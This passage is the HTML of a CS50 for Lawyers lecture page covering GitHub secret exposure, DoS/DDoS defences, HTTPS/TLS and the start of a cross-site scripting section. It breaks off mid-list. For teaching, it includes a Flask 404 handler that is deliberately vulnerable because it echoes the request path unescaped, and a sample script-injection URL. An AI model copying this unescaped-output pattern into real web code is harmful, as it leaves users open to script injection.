@@ -1,0 +1,1013 @@
+<!DOCTYPE html><html lang="en-us"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+        <meta charset="utf-8">
+        <meta name="viewport" content="initial-scale=1, width=device-width">
+
+        <meta property="og:image" content="https://img.youtube.com/vi/nrB1aMKgjvU/maxresdefault.jpg">
+
+        <meta property="og:title" content="Lecture 9 - CS50's Computer Science for Lawyers">
+
+        <link href="../../favicon%EF%B9%961779994621.ico" rel="icon">
+
+        <!-- https://fonts.google.com/specimen/PT+Sans?query=PT+Sans&selection.family=PT+Sans:ital,wght@0,400;0,700;1,400;1,700 -->
+        <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js"></script>
+
+        <!-- https://getbootstrap.com/docs/ -->
+        <script src="../../assets/jquery/dist/jquery.min%EF%B9%961779994621.js"></script>
+        <script src="../../assets/bootstrap/dist/js/bootstrap.bundle.min%EF%B9%961779994621.js"></script>
+
+        <!-- https://bootstrap-table.com/docs/getting-started/introduction/ -->
+        <link href="../../assets/bootstrap-table/dist/bootstrap-table.min%EF%B9%961779994621.css" rel="stylesheet">
+        <script src="../../assets/bootstrap-table/dist/bootstrap-table.min%EF%B9%961779994621.js"></script>
+        <script src="../../assets/bootstrap-table/dist/extensions/mobile/bootstrap-table-mobile.min%EF%B9%961779994621.js"></script>
+
+        <!-- https://fontawesome.com/how-to-use/on-the-web/referencing-icons/basic-use -->
+        
+        <link href="https://kit.fontawesome.com/a6e66aa089.css" rel="stylesheet">
+        
+
+        <!-- https://moment.github.io/luxon/ -->
+        <script src="../../assets/luxon/build/global/luxon.min%EF%B9%961779994621.js"></script>
+
+        <!-- http://docs.mathjax.org/ -->
+        <!-- http://docs.mathjax.org/en/latest/options/output/chtml.html?highlight=displayAlign#the-configuration-block -->
+        <!-- https://docs.mathjax.org/en/latest/output/fonts.html -->
+        <script>
+            MathJax = {
+                loader: {
+                    paths: {
+                        'mathjax-newcm': '[mathjax]/../@mathjax/mathjax-newcm-font',
+                    }
+                },
+                output: {
+                    displayAlign: 'left'
+                }
+            };
+        </script>
+        <script src="../../assets/mathjax/tex-mml-chtml%EF%B9%961779994621.js"></script>
+
+        <!-- https://github.com/verlok/vanilla-lazyload -->
+        <script src="../../assets/vanilla-lazyload/dist/lazyload.min%EF%B9%961779994621.js"></script>
+
+        <!-- https://iframe-resizer.com/ -->
+        <script src="../../assets/@iframe-resizer/parent/index.umd%EF%B9%961779994621.js"></script>
+
+        <!-- https://github.com/scratchblocks/scratchblocks/releases -->
+        <script src="../../assets/scratchblocks.min%EF%B9%961779994621.js"></script>
+
+        <!-- https://mermaid-js.github.io/ -->
+        <script src="../../assets/mermaid/dist/mermaid.min%EF%B9%961779994621.js"></script>
+
+        <!-- https://github.com/twitter/twemoji -->
+        <script src="../../assets/@twemoji/api/dist/twemoji.min%EF%B9%961779994621.js"></script>
+
+        
+
+        <link href="../../assets/page%EF%B9%961779994621.css" rel="stylesheet">
+        <script src="../../assets/jekyll-theme-cs50%EF%B9%961779994621.js"></script>
+
+        <script>
+            window.CS50 = {
+                local: {"day":"numeric","hour":"numeric","minute":"numeric","month":"long","timeZoneName":"short","weekday":"long","year":"numeric"},
+                locale: "en",
+                tz: "Etc/Zulu"
+            };
+        </script>
+
+        <title>Lecture 9 - CS50's Computer Science for Lawyers</title>
+
+
+    <meta property="og:description" content="Git/GitHub Git and GitHub allow users to save their code to an internet based repository and track their code for changes. For example, if a user realizes...">
+</head>
+
+    <body class="invisible">
+
+        <div class="alert fixed-top mb-0 rounded-0" data-alert="success dismissible" data-hash="6f8367eb76bcab826a4ac0a183efe41a" id="alert" role="alert">
+            <button aria-label="Close" class="btn-close d-none" data-bs-dismiss="alert" type="button"></button><p>Interested in <a href="../../index.html#how-to-take-this-course">a verified certificate, a certificate of completion, or a custom program</a>?</p>
+</div>
+        
+
+        <div class="container-fluid">
+
+            <div class="row">
+
+                <aside class="col-lg">
+ 
+                    <header><h1 data-id="cs50s-computer-science-for-lawyers"><a href="../../index.html">CS50’s Computer Science for Lawyers</a></h1>
+
+<p>OpenCourseWare</p>
+
+<p><a class="pr-1 small" href="https://cs50.harvard.edu/donate">Donate<i aria-hidden="true" class="fas fa-external-link-alt ps-2"></i></a></p>
+
+<p class="text-white"><a href="http://douglloyd.com/">Doug Lloyd</a>, J.D.<br>
+<a href="mailto:lloyd@cs50.harvard.edu">lloyd@cs50.harvard.edu</a></p>
+
+<p><a href="https://cs.harvard.edu/malan/">David J. Malan</a>
+<br>
+<a href="mailto:malan@harvard.edu">malan@harvard.edu</a>
+<br>
+<a class="mr-1" href="https://www.facebook.com/dmalan"><i aria-hidden="true" class="fa-brands fa-facebook-f" title="Facebook"></i><span class="visually-hidden">Facebook</span></a>
+<a class="mr-1" href="https://github.com/dmalan"><i aria-hidden="true" class="fa-brands fa-github" title="GitHub"></i><span class="visually-hidden">GitHub</span></a>
+<a class="mr-1" href="https://www.instagram.com/davidjmalan/"><i aria-hidden="true" class="fa-brands fa-instagram" title="Instagram"></i><span class="visually-hidden">Instagram</span></a>
+<a class="mr-1" href="https://www.linkedin.com/in/malan/"><i aria-hidden="true" class="fa-brands fa-linkedin" title="LinkedIn"></i><span class="visually-hidden">LinkedIn</span></a>
+<a class="mr-1" href="https://www.reddit.com/user/davidjmalan"><i aria-hidden="true" class="fa-brands fa-reddit-alien" title="Reddit"></i><span class="visually-hidden">Reddit</span></a>
+<a class="mr-1" href="https://www.threads.net/@davidjmalan"><i aria-hidden="true" class="fa-brands fa-threads" title="Threads"></i><span class="visually-hidden">Threads</span></a>
+<a class="mr-1" href="https://twitter.com/davidjmalan"><i aria-hidden="true" class="fa-brands fa-twitter" title="Twitter"></i><span class="visually-hidden">Twitter</span></a></p></header>
+
+                    
+
+                    <button aria-controls="nav" aria-expanded="false" class="btn btn-sm collapsed d-lg-none" data-bs-target="aside > nav" data-bs-toggle="collapse">
+                        Menu
+                    </button>
+
+                    <nav class="collapse d-lg-block" id="nav"><hr>
+
+<ul>
+  <li data-marker="*"><a href="../../../x/puzzles/index.html"><i class="fas fa-puzzle-piece pe-2"></i>CS50x Puzzle Day</a></li>
+  <li data-marker="*"><a href="../../zoom/index.html"><i class="fa-solid fa-video me-2"></i>Zoom Meetings<span class="badge ms-2 p-1 text-bg-warning">new</span></a></li>
+</ul>
+
+<!-- Tools -->
+<hr class="small">
+
+<ul class="small">
+  <li data-marker="*"><a href="https://cs50.ai/"><i class="fa-solid fa-duck pe-2 text-decoration-none"></i>CS50.ai</a></li>
+  <li data-marker="*">
+<a href="https://cs50.edx.org/ed"><i class="fa-solid fa-comment-question pe-2 text-decoration-none"></i>Ed Discussion</a> for Q&amp;A</li>
+  <li data-marker="*">
+</li></ul>
+
+<!-- Course Nav -->
+<hr>
+
+<ol>
+  <li><a href="../../weeks/1/index.html">Computational Thinking</a></li>
+  <li><a href="../../weeks/2/index.html">Programming Languages</a></li>
+  <li><a href="../../weeks/3/index.html">Algorithms, Data Structures</a></li>
+  <li><a href="../../weeks/4/index.html">Cryptography</a></li>
+  <li><a href="../../weeks/5/index.html">Cybersecurity I</a></li>
+  <li><a href="../../weeks/6/index.html">Internet Technologies, Cloud Computing</a></li>
+  <li><a href="../../weeks/7/index.html">Web Development</a></li>
+  <li><a href="../../weeks/8/index.html">Database Design</a></li>
+  <li><a href="../../weeks/9/index.html">Cybersecurity II</a></li>
+  <li><a href="../../weeks/10/index.html">Challenges at the Intersection of Law and Technology</a></li>
+</ol>
+
+<!-- Items that might usually appear in an academic syllabus -->
+<hr>
+
+<ul>
+  <li data-marker="*"><a href="../../honesty/index.html">Academic Honesty</a></li>
+  <li data-marker="*"><a href="../../certificate/index.html">CS50 Certificate</a></li>
+  <li data-marker="*"><a href="../../faqs/index.html">FAQs</a></li>
+  <li data-marker="*"><a href="https://cs50.me/cs50l">Gradebook</a></li>
+  <li data-marker="*"><a href="../../staff/index.html">Staff</a></li>
+  <li data-marker="*">
+</li></ul>
+
+<!-- Where to watch or take the class course -->
+<hr>
+
+<ul class="small">
+  <li data-marker="*"><a href="https://apps.apple.com/us/app/cs50/id1631064453">Apple TV</a></li>
+  <li data-marker="*"><a href="https://cs50.edx.org/law">edX</a></li>
+  <li data-marker="*">
+  </li><li data-marker="*"><a href="https://play.google.com/store/apps/details?id=edu.harvard.cs50.googletv">Google TV</a></li>
+  <li data-marker="*">
+  </li><li data-marker="*"><a href="https://execed.law.harvard.edu/computerscience/">Harvard Law School</a></li>
+  <li data-marker="*">
+  </li><li data-marker="*"><a href="https://channelstore.roku.com/details/e338f60adfb133abc19eac2da9e5c505:40cee2a1909355bc4496086c8fa4a86f/cs50">Roku <span class="badge ms-2 p-1 text-bg-warning">new</span></a></li>
+  <li data-marker="*"><a href="https://www.youtube.com/playlist?list=PLhQjrBD2T380CIOjHCjIAugO3ryncp6IW">YouTube</a></li>
+</ul>
+
+<!-- Manual page, style guide, other docs -->
+
+<!-- Status Page -->
+<hr>
+
+<ul class="small">
+  <li data-marker="*"><a href="https://cs50.statuspage.io/">Status Page</a></li>
+</ul>
+
+<!-- Communities -->
+<hr>
+
+<ul>
+  <li data-marker="*"><a href="../../communities/index.html"><strong>Communities</strong></a></li>
+  <li data-marker="*" class="small"><a href="https://bsky.app/profile/cs50.harvard.edu">Bluesky</a></li>
+  <li data-marker="*" class="small"><a href="https://www.clubhouse.com/club/cs50">Clubhouse</a></li>
+  <li data-marker="*" class="small">
+<a href="https://discord.gg/cs50">Discord</a> <span class="badge bg-light ms-1 py-1 rounded-pill text-dark">Q&amp;A</span>
+</li>
+  <li data-marker="*" class="small">
+<a href="https://cs50.edx.org/ed">Ed</a> <span class="badge bg-light ms-1 py-1 rounded-pill text-dark">Q&amp;A</span>
+</li>
+  <li data-marker="*" class="small">
+<a href="https://www.facebook.com/groups/cs50/">Facebook Group</a> <span class="badge bg-light ms-1 py-1 rounded-pill text-dark">Q&amp;A</span>
+</li>
+  <li data-marker="*" class="small"><a href="https://www.facebook.com/cs50/">Facebook Page</a></li>
+  <li data-marker="*" class="small"><a href="https://github.com/cs50">GitHub</a></li>
+  <li data-marker="*" class="small">
+<a href="https://gitter.im/cs50/x">Gitter</a> <span class="badge bg-light ms-1 py-1 rounded-pill text-dark">Q&amp;A</span>
+</li>
+  <li data-marker="*" class="small"><a href="https://instagram.com/cs50">Instagram</a></li>
+  <li data-marker="*" class="small"><a href="https://www.linkedin.com/groups/7437240/">LinkedIn Group</a></li>
+  <li data-marker="*" class="small"><a href="https://www.linkedin.com/school/CS50/">LinkedIn Page</a></li>
+  <li data-marker="*" class="small"><a href="https://cs50.medium.com/">Medium</a></li>
+  <li data-marker="*" class="small"><a href="https://www.quora.com/topic/CS50">Quora</a></li>
+  <li data-marker="*" class="small">
+<a href="https://www.reddit.com/r/cs50/">Reddit</a> <span class="badge bg-light ms-1 py-1 rounded-pill text-dark">Q&amp;A</span>
+</li>
+  <li data-marker="*" class="small">
+<a href="https://cs50.edx.org/slack">Slack</a> <span class="badge bg-light ms-1 py-1 rounded-pill text-dark">Q&amp;A</span>
+</li>
+  <li data-marker="*" class="small"><a href="https://www.snapchat.com/add/cs50">Snapchat</a></li>
+  <li data-marker="*" class="small"><a href="https://soundcloud.com/cs50">SoundCloud</a></li>
+  <li data-marker="*" class="small">
+<a href="https://cs50.stackexchange.com/">Stack Exchange</a> <span class="badge bg-light ms-1 py-1 rounded-pill text-dark">Q&amp;A</span>
+</li>
+  <li data-marker="*" class="small"><a href="https://t.me/cs50x">Telegram</a></li>
+  <li data-marker="*" class="small"><a href="https://www.tiktok.com/@cs50">TikTok</a></li>
+  <li data-marker="*" class="small"><a href="https://www.threads.net/@cs50">Threads</a></li>
+  <li data-marker="*" class="small"><a href="https://x.com/cs50">X Account</a></li>
+  <li data-marker="*" class="small"><a href="https://x.com/i/communities/1722308663522594923">X Community</a></li>
+  <li data-marker="*" class="small"><a href="https://www.youtube.com/subscription_center?add_user=cs50tv">YouTube</a></li>
+</ul>
+
+<!-- Courses -->
+<hr>
+
+<ul>
+  <li data-marker="*"><a href="../../courses/index.html"><strong>Courses</strong></a></li>
+  <li data-marker="*" class="small"><a href="../../../x/index.html">CS50x</a></li>
+  <li data-marker="*" class="small"><a href="../../../games/index.html">CS50 2D</a></li>
+  <li data-marker="*" class="small"><a href="../../../ai/index.html">CS50 AI</a></li>
+  <li data-marker="*" class="small"><a href="../../../business/index.html">CS50 Business</a></li>
+  <li data-marker="*" class="small"><a href="../../../cybersecurity/index.html">CS50 Cybersecurity</a></li>
+  <li data-marker="*" class="small"><a href="../../index.html">CS50 for Lawyers</a></li>
+  <li data-marker="*" class="small"><a href="../../../python/index.html">CS50 Python</a></li>
+  <li data-marker="*" class="small"><a href="../../../r/index.html">CS50 R</a></li>
+  <li data-marker="*" class="small"><a href="../../../scratch/index.html">CS50 Scratch</a></li>
+  <li data-marker="*" class="small"><a href="../../../sql/index.html">CS50 SQL</a></li>
+  <li data-marker="*" class="small"><a href="../../../web/index.html">CS50 Web</a></li>
+</ul>
+
+<!-- Harvard Shop -->
+<hr>
+
+<p><a href="https://cs50.harvardshop.com/"><img src="../../../x/2023/assets/shop.png" alt="Harvard Shop"></a></p>
+
+<!-- Legal -->
+<hr>
+
+<p><a href="../../license/index.html" class="small"><i class="fab fa-creative-commons me-1"></i>License</a></p></nav>
+
+                    <footer></footer>
+
+                </aside>
+
+                <main class="col-lg">
+
+                    <h1 class="no_toc" id="lecture-9">Lecture 9</h1>
+
+<ul class="small" id="markdown-toc">
+  <li>
+<a href="#gitgithub" id="markdown-toc-gitgithub">Git/GitHub</a>    <ul>
+      <li><a href="#working-on-github" id="markdown-toc-working-on-github">Working on GitHub</a></li>
+      <li>
+<a href="#accidental-exposure" id="markdown-toc-accidental-exposure">Accidental Exposure</a>        <ul>
+          <li><a href="#fixing-an-accidental-exposure" id="markdown-toc-fixing-an-accidental-exposure">Fixing an Accidental Exposure</a></li>
+          <li><a href="#preventing-accidental-exposure" id="markdown-toc-preventing-accidental-exposure">Preventing Accidental Exposure</a></li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>
+<a href="#dos-attack" id="markdown-toc-dos-attack">DoS Attack</a>    <ul>
+      <li><a href="#stopping-dos-attacks" id="markdown-toc-stopping-dos-attacks">Stopping DoS Attacks</a></li>
+    </ul>
+  </li>
+  <li>
+<a href="#http-vs-https" id="markdown-toc-http-vs-https">HTTP vs HTTPS</a>    <ul>
+      <li><a href="#ssltls-certificates" id="markdown-toc-ssltls-certificates">SSL/TLS Certificates</a></li>
+    </ul>
+  </li>
+  <li>
+<a href="#cross-site-scripting-xss" id="markdown-toc-cross-site-scripting-xss">Cross-Site Scripting (XSS)</a>    <ul>
+      <li><a href="#protecting-against-xss" id="markdown-toc-protecting-against-xss">Protecting against XSS</a></li>
+      <li><a href="#cross-site-request-forgery-csrf" id="markdown-toc-cross-site-request-forgery-csrf">Cross-Site Request Forgery (CSRF)</a></li>
+    </ul>
+  </li>
+  <li>
+<a href="#databases" id="markdown-toc-databases">Databases</a>    <ul>
+      <li><a href="#sql-injection-attacks" id="markdown-toc-sql-injection-attacks">SQL Injection Attacks</a></li>
+    </ul>
+  </li>
+  <li><a href="#phishing" id="markdown-toc-phishing">Phishing</a></li>
+</ul>
+
+<h2 id="gitgithub">Git/GitHub</h2>
+
+<ul>
+  <li data-marker="*">
+    <p>Git and GitHub allow users to save their code to an internet based repository and track their code for changes.</p>
+
+    <ul>
+      <li data-marker="*">For example, if a user realizes that they’ve broken previously functioning code, they can use GitHub to revert to an old version of their code. This is called <em>version control</em>.</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="working-on-github">Working on GitHub</h3>
+
+<ul>
+  <li data-marker="*">
+    <p>Suppose we have some files that we would like to save on GitHub. We would package these files up into a <em>commit</em>, a package that we send to the Internet, and <em>push</em> this commit onto GitHub. This constitutes our <em>initial commit</em>.</p>
+  </li>
+  <li data-marker="*">
+    <p>To track changes, GitHub tracks the chain of commits. This chain of commits is similar to a linked list, where each commit knows about the commit that comes after it (once that commit is pushed) as well as all of the commits before it.</p>
+  </li>
+  <li data-marker="*">
+    <p>GitHub was designed to encourage developers and programmers to create an open source community where anyone can view another’s code. This means that we can search all of the public repositories, and if there is a match, we can view that entire repository.</p>
+  </li>
+  <li data-marker="*">
+    <p>We can also <em>fork</em> another person’s code.</p>
+
+    <ul>
+      <li data-marker="*">
+        <p>Forking a repository refers to taking the entire collection of files and copying it onto our own GitHub.</p>
+      </li>
+      <li data-marker="*">
+        <p>After forking, we can make changes or suggest changes before pushing these changes back to the original repository.</p>
+      </li>
+    </ul>
+  </li>
+  <li data-marker="*">
+    <p>GitHub also lets people work from multiple workstations, allowing for collaboration. This concept may be reminiscent of Google Drive or Dropbox.</p>
+
+    <ul>
+      <li data-marker="*">To work with another person on a repository, we simply push changes onto this repository, and the other person <em>pulls</em> these changes. If the other person makes changes, they simply push their changes, and then, we pull.</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="accidental-exposure">Accidental Exposure</h3>
+
+<h4 id="fixing-an-accidental-exposure">Fixing an Accidental Exposure</h4>
+
+<p>Now, let’s suppose we’ve pushed a new commit; however, we’ve accidentally included sensitive information, maybe a password, in the files, and now this sensitive information is on the Internet!</p>
+
+<p>What we’ve done with GitHub might look something like this:</p>
+
+<p><img src="git_exposed.png" alt="accidental_exposure"></p>
+
+<ul>
+  <li data-marker="*">
+    <p>We could try removing the sensitive information and pushing a new commit.</p>
+
+    <p><img src="git.png" alt="accidental_exposure_fix"></p>
+
+    <ul>
+      <li data-marker="*">This, however, would not solve our problem. Git has stored all of our previous commits, and thus, our sensitive information is still on GitHub.</li>
+    </ul>
+  </li>
+  <li data-marker="*">
+    <p>Instead, we can clear a portion of our history by using <code class="language-plaintext highlighter-rouge">git-rebase</code>.</p>
+
+    <ul>
+      <li data-marker="*">
+        <p>This allows us to pick a previous starting point and erase every commit from then on. In our case, we would like to rebase to the first commit.</p>
+
+        <p><img src="initial_commit.png" alt="accidental_exposure_rebase"></p>
+      </li>
+      <li data-marker="*">
+        <p>Note that when we return to a previous commit, all changes from then are erased. Thus, it’s important to copy important changes somewhere else before rebasing to a previous commit.</p>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h4 id="preventing-accidental-exposure">Preventing Accidental Exposure</h4>
+
+<ul>
+  <li data-marker="*">
+    <p>We can use <code class="language-plaintext highlighter-rouge">git-secrets</code>, which will warn us whenever we make a commit that might contain “secrets.” <code class="language-plaintext highlighter-rouge">git-secrets</code> checks for these “secrets” by using <em>regular expressions</em>, a sequence of symbols and characters that represents a set of strings to be searched for in a longer piece of text. Whenever <code class="language-plaintext highlighter-rouge">git-secrets</code> finds a match, it will warn us, asking us if we are sure that we’d like to proceed with committing.</p>
+  </li>
+  <li data-marker="*">
+    <p>We can also limit 3rd party app access. One particular example is OAuth, where we can log into other services via our Facebook, Google, or GitHub accounts. This allows the 3rd party application the ability to use and access our, for example, GitHub identity.</p>
+  </li>
+  <li data-marker="*">
+    <p>We can use “commit hooks,” or sets of instructions that execute when a commit is pushed to GitHub.</p>
+
+    <ul>
+      <li data-marker="*">
+        <p>In CS50, when files are changed and a commit is pushed, a commit hook is triggered. This commit hook then copies these changed files onto CS50’s web server and runs tests to ensure that there are no errors in them. If all the tests pass, then the files can be activated on the web server.</p>
+      </li>
+      <li data-marker="*">
+        <p>To prevent accidental exposure, we can use these commit hooks to ensure that there are no passwords on our files.</p>
+      </li>
+    </ul>
+  </li>
+  <li data-marker="*">
+    <p>We can use SSH keys as identification verification. For example, when using SSH keys, when we push a commit to GitHub, we also digitally sign the commit. Before this commit is posted to GitHub, GitHub will verify that the commit was actually pushed by us by checking our public key.</p>
+  </li>
+  <li data-marker="*">
+    <p>Finally, we can use two factor authentication with two factors that are fundamentally different. Having two very different factors makes it difficult for an adversary to have or know both authentication methods. Generally this means a password and a cell phone or RSA key.</p>
+
+    <ul>
+      <li data-marker="*">
+        <p><em>RSA keys</em> are a form of two factor authentication.</p>
+
+        <ul>
+          <li data-marker="*">
+            <p>There is a six digit number inside the window of an RSA key that changes every 60 seconds via an algorithm.</p>
+          </li>
+          <li data-marker="*">
+            <p>When we’re assigned an RSA key by a company, the company’s server will contain a mapping from the RSA key’s serial number (located on the back) and some sort of employee identification. However, note that the company does not know the six digit number on the RSA key, just the serial number of the RSA key itself.</p>
+
+            <ul>
+              <li data-marker="*">To complete a log in via an RSA key, we’ll have to enter the number on our RSA key.</li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li data-marker="*">
+        <p>Other tools that provide two factor authentication include Google Authenticator, Authy, Duo Mobile, and even SMS.</p>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="dos-attack">DoS Attack</h2>
+
+<ul>
+  <li data-marker="*">
+    <p><em>DoS attacks</em>, or denial of service attacks, cripple the infrastructure of websites by having an adversary send so many requests to a server that the server becomes overloaded and eventually crashes.</p>
+  </li>
+  <li data-marker="*">
+    <p>These attacks are relatively easy to execute—a commercially available machine might be able to execute a DoS attack on a small business running on its own servers.</p>
+  </li>
+  <li data-marker="*">
+    <p>When attacking a medium sized companies, however, one computer and one IP address is generally not enough to execute a DoS attack. Instead, the hacker(s) can use a <em>botnet</em> to execute a <em>DDoS</em> attack, or a distributed denial of service attack.</p>
+
+    <ul>
+      <li data-marker="*">
+        <p>A botnet is created when hackers distribute worms or viruses that don’t do anything until activated. After activation, it becomes an agent or a zombie, controlled by the hackers.</p>
+      </li>
+      <li data-marker="*">
+        <p>In this case, the hackers gain control of thousands or hundreds of thousands of devices. These devices can then all make web requests to the same server, eventually causing the server to crash.</p>
+      </li>
+    </ul>
+  </li>
+  <li data-marker="*">
+    <p>These attacks are very common—about 16% - 35% of businesses per year are attacked.</p>
+  </li>
+  <li data-marker="*">
+    <p>Cloud computing has magnified the consequences of DoS attacks. In cloud computing, we generally rent server space and power from an entity like Amazon Web Services or Google Cloud Services. Then, many businesses share the same physical resources, so if one business is attacked and the server crashes, that will affect the other business as well.</p>
+  </li>
+  <li data-marker="*">
+    <p>Consequences can be even further magnified when internet providing services are attacked.</p>
+
+    <ul>
+      <li data-marker="*">
+        <p>For example, DYN, a DNS (domain name service) provider, was attacked by DDoS attacks in 2016, and this attack lasted 10 hours.</p>
+      </li>
+      <li data-marker="*">
+        <p>Attacking a DNS provider is particularly harmful because generally, we do not know the IP addresses of websites, we only know their URLs. To complete a request, then, we depend on a DNS provider to map that URL to an IP address.</p>
+      </li>
+      <li data-marker="*">
+        <p>When a DNS provider is attacked, it becomes overloaded with requests from some botnet and is no longer able to complete actual requests. This means that IP addresses can’t be mapped to URLs anymore, so no one can visit any websites via URLs.</p>
+      </li>
+    </ul>
+  </li>
+  <li data-marker="*">
+    <p>If interested in reading about how violations of computer-based crimes are prosecuted, check out the Computer Fraud and Abuse Act, codified at USC 1030.</p>
+  </li>
+</ul>
+
+<h3 id="stopping-dos-attacks">Stopping DoS Attacks</h3>
+
+<ul>
+  <li data-marker="*">
+    <p>A DoS attack can be stopped by configuring the server to stop accepting requests from the IP address that is currently attempting to overload the server.</p>
+  </li>
+  <li data-marker="*">
+    <p>A DDos attack is much more difficult to stop, however, because of its usage of many, many addresses. There are multiple techniques we might use to avert DDoS attacks.</p>
+
+    <ul>
+      <li data-marker="*">
+        <p>We can set up a firewall where we only accept certain types of requests. While we’ll allow requests from any IP address, we’ll only allow requests into certain ports.</p>
+
+        <ul>
+          <li data-marker="*">For example, perhaps a server typically expects to receive requests on HTTPS, or port 443. If a DDoS attack begins, and the server begins to receive a lot of HTTP requests on port 80, the server can simply stop accepting requests on port 80 until the attack stops.</li>
+        </ul>
+      </li>
+      <li data-marker="*">
+        <p>Another technique is called sinkholing, where all requests are let in, but the server doesn’t complete any requests. The server, then, does remain up, meaning the website won’t be taken down. Note that in this case, legitimate requests also will not be completed.</p>
+      </li>
+      <li data-marker="*">
+        <p>We can also do packet analysis, where we take a look at the headers of the requests that are being sent. These headers contain information such as their IP address, their OS, their browser, and their geographic location.</p>
+
+        <ul>
+          <li data-marker="*">For example, perhaps a server typically expects to receive requests from the US Northeast. If a DDos attack begins, and the server begins to receive a lot of requests from another geographic location, the server can stop accepting requests from that location.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="http-vs-https">HTTP vs HTTPS</h2>
+
+<ul>
+  <li data-marker="*">
+    <p>HTTP, or the HyperText Transfer Protocol, is used to define and facilitate communications between clients and servers over the internet.</p>
+
+    <ul>
+      <li data-marker="*">
+        <p>An HTTP version 1.1 request might look like this:</p>
+
+        <div class="language-plaintext highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>GET /execed HTTP/1.1
+Host: law.harvard.edu
+</code></pre></div>        </div>
+
+        <ul>
+          <li data-marker="*">In this case <code class="language-plaintext highlighter-rouge">GET</code> refers to asking the server to retreive the page <code class="language-plaintext highlighter-rouge">/execed</code> from the host <code class="language-plaintext highlighter-rouge">law.harvard.edu</code>.</li>
+        </ul>
+      </li>
+      <li data-marker="*">
+        <p>HTTP requests are not encrypted. When the request is sent, it will likely go through many routers before ultimately being delivered to the server.</p>
+
+        <p>![routers][routers.png]</p>
+
+        <ul>
+          <li data-marker="*">
+            <p>Since HTTP requests are not encrypted, if the data is being sent over an unsecured network, then it is rather simple to read the contents of the packets going to and from.</p>
+          </li>
+          <li data-marker="*">
+            <p>Additionally, a router may be compromised.</p>
+
+            <ul>
+              <li data-marker="*">
+                <p>For example, the router may contain a worm that will eventually cause the router to participate in a DDoS attack.</p>
+              </li>
+              <li data-marker="*">
+                <p>If a router is compromised in a way such that an adversary can read all the traffic that flows through it, then our information, sent via HTTP, is not secured. This can be solved by HTTPS.</p>
+              </li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li data-marker="*">
+    <p>HTTPS is the secured version of HTTP, encrypting communications between client and server.</p>
+
+    <ul>
+      <li data-marker="*">In HTTPS communications, the server is responsible for providing a valid <em>SSL or TLS certificate</em>.</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="ssltls-certificates">SSL/TLS Certificates</h3>
+
+<ul>
+  <li data-marker="*">
+    <p>Certificate authorities work alongside the internet to verify that a website owns a particular public key.</p>
+
+    <ul>
+      <li data-marker="*">The website digitally signs something to the certificate authority. The certificate authority then checks the digital signature to verify that this person owns this public key.</li>
+    </ul>
+  </li>
+  <li data-marker="*">
+    <p>SSL is the <em>Secure Sockets Layer</em>, another encryption-related protocol for network communications. It has been updated and revised as TLS or <em>Transport Layer Security</em>.</p>
+  </li>
+  <li data-marker="*">
+    <p>When we make a request via HTTPS to a server, we first make a request asking to begin encrypted communications with the server. This request is encrypted using the server’s public key that the certificate authority has verified.</p>
+  </li>
+  <li data-marker="*">
+    <p>The server receives the request and decrypts it with their private key. The server will then send a key back to us, encrypted using our public key.</p>
+  </li>
+  <li data-marker="*">
+    <p>The key that the server sends back to us is a cipher. This is referred to as a <em>session</em> key, and it is used to encrypt and decrypt all further communications between us and server until the session ends.</p>
+  </li>
+</ul>
+
+<h2 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h2>
+
+<ul>
+  <li data-marker="*">
+    <p><em>Client-side code</em> is something that runs locally on our computers.</p>
+  </li>
+  <li data-marker="*">
+    <p><em>Server-side code</em> is run on the server. When we get information back from the server, we receive the output of the code instead of the code itself.</p>
+  </li>
+  <li data-marker="*">
+    <p><em>Cross-Site Scripting</em> occurs when an adversary tricks a client’s browser to run something locally.</p>
+
+    <ul>
+      <li data-marker="*">
+        <p>Let’s take a look at this Python code, written using a package called Flask that allows us to build web servers.</p>
+
+        <ul>
+          <li data-marker="*">
+            <div class="language-python highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="k">return</span> <span class="sh">"</span><span class="s">Hello, world!</span><span class="sh">"</span>
+
+<span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">not_found</span><span class="p">(</span><span class="n">err</span><span class="p">):</span>
+    <span class="k">return</span> <span class="sh">"</span><span class="s">Not found: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">request</span><span class="p">.</span><span class="n">path</span>
+</code></pre></div>            </div>
+          </li>
+          <li data-marker="*">
+            <p>Note that when we visit the <code class="language-plaintext highlighter-rouge">/</code> page on the web server, the <code class="language-plaintext highlighter-rouge">index</code> function will be called, and we will receive an HTML page whose content is “Hello, world!”</p>
+          </li>
+          <li data-marker="*">
+            <p>If we go to a page that is not on the server, we’ll get a 404 error. Then the <code class="language-plaintext highlighter-rouge">not_found</code> function will be called, and we will receive an HTML page whose content is “Not found: “ and the page that we were looking for.</p>
+
+            <ul>
+              <li data-marker="*">
+                <p>For example, if we go to <code class="language-plaintext highlighter-rouge">/foo</code>, we’ll get an HTML page that says “Not found: /foo”</p>
+              </li>
+              <li data-marker="*">
+                <p>However, if we visit <code class="language-plaintext highlighter-rouge">/&lt;script&gt;alert('hi')&lt;/script&gt;,</code> the <code class="language-plaintext highlighter-rouge">not_found</code> function will return “Not found: “ and this path, which the browser will interpret as HTML. Then, when we receive this as a response from the server, our browser will show the HTML page and an alert saying “hi.”</p>
+              </li>
